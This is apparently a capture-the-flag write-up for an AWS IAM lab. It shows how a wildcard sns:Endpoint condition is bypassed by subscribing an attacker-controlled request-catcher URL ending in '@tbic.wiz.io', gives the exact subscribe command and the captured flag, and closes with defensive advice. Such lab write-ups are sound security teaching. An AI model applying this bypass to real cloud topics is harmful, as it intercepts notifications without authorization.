# Writeup for Big IAM Challenge: Challenge 3

# Challenge number

    3

## Challenge Statement

The goal of Challenge 3 is to exploit an overly permissive IAM policy on an Amazon SNS topic to subscribe without authorization, intercept notifications, and capture the flag within the message. The challenge highlights the risks of weak access controls in cloud environments.

## IAM Policy

```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

### Short analysis about the IAM policy

```
* What do I have access to?
  - The policy allows anyone (Principal: "*") to subscribe to the TBICWizPushNotifications SNS topic as long as the subscription endpoint matches *@tbic.wiz.io.

* What don't I have access to?
  - The policy does not grant access to publish messages or manage the topic itself, limiting interaction to subscribing and receiving notifications.

* What do I find interesting?
  - The condition in the policy (sns:Endpoint: "*@tbic.wiz.io") limits subscriptions to specific email addresses, but it’s still overly permissive, allowing external users with matching domains to exploit this.
```

## Solution

### Step 1: Set Up a Custom Endpoint

To bypass the sns:Endpoint condition, I utilized Request Catcher (https://requestcatcher.com/). I created a custom catcher endpoint:

```
https://anil.requestcatcher.com/
```

This endpoint could receive and log HTTP requests, allowing me to intercept messages sent by SNS.

### Step 2: Subscribed to the SNS Topic

Using the custom endpoint, I executed the following command to subscribe to the TBICWizPushNotifications SNS topic:

```
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint 'https://anil.requestcatcher.com/test@tbic.wiz.io'
```

The command returned a Subscription ARN, confirming that the subscription request was successful.

### Step 3: Confirmed the Subscription

After running the `aws sns subscribe` command, the response indicated the subscription was in a "pending confirmation" state:

```
{
    "SubscriptionArn": "pending confirmation"
}
```

To confirm the subscription, I checked the logs of my Request Catcher endpoint (https://anil.requestcatcher.com/test@tbic.wiz.io). The logs showed an HTTP POST request containing the SubscriptionConfirmation message, which included a SubscribeURL to confirm the subscription.

### Step 4: Captured the Flag

After confirmation, I waited for notifications to be sent to the topic. Shortly after, a new request was logged in Request Catcher with the message content:

```
{
  "Type" : "Notification",
  "MessageId" : "cf626a84-6014-5f7b-ae44-0a8b6c00f0f6",
  "TopicArn" : "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message" : "{wiz:always-suspect-asterisks}",
  "Timestamp" : "2025-01-25T15:57:08.497Z"
}
```

I extracted the flag from the Message field:

```
FLAG: {wiz:always-suspect-asterisks}
```

### Step 5: Submitted the Flag

Finally, I inserted the flag found in the "Insert flag here" textbox and was redirected to the success screen.

## Reflection

- **What was your approach?**  
  I bypassed the sns:Endpoint condition by using Request Catcher to simulate a valid endpoint and successfully intercepted SNS notifications.

- **What was the biggest challenge?**  
  The challenge was ensuring that the custom endpoint met the policy's condition while being able to capture and log requests.

- **How did you overcome the challenges?**  
  Using Request Catcher allowed me to create a compliant endpoint (https://anil.requestcatcher.com/) and efficiently capture the confirmation and notification messages.

- **What led to the breakthrough?**  
  Understanding that sns:Endpoint conditions validate the domain pattern but do not verify endpoint ownership enabled me to bypass this restriction. Request Catcher proved to be an invaluable tool to simulate an endpoint and capture SNS traffic.

- **On the Blue Side: Defensive Measures**  
  - Restrict the Principal: Replace `Principal: "*"` with trusted roles or accounts to limit unauthorized access.
  - Use endpoint verification: Ensure that endpoints are owned or managed by the intended recipients using tokenized confirmation processes.
  - Disable overly broad conditions: Replace wildcard conditions like `sns:Endpoint: "*@tbic.wiz.io"` with specific allowed endpoints.
  - Monitor subscriptions and logs: Regularly audit SNS subscriptions and logs for suspicious activities.
  - Enable encryption: Use message encryption to protect sensitive data in transit.

This challenge highlights the importance of securing SNS topics to prevent unauthorized access and data leaks.

